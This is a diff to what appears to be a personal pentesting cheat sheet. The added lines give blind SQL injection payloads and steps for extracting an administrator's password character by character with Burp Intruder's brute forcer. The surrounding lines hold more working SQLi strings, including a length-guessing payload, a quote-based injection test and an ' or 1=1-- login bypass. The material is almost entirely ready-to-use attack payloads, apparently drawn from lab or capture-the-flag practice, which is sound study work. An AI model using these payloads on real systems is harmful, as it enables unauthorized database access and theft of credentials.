@@ -194,7 +194,11 @@ sudo openvpn nmap -sV {target IP}
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--} --select a specific user from user_column
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--} --guessing userpass length from DB table
 - you can change the value of the password length and also change the '>' to '='
-[+] {
+[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID  --payload to bruteforce password  
+[-] change payload type to BRUTE FORCER and min:1 max:1 then start attack
+[-] check for one with a different value than the others in the result
+[-] change the payload password number to 2...e.t.c
+ 
 
 [+] test login with {'} if internal error shows then it allows SQLi
 [+] {' or 1=1--} -- bypass login page pass
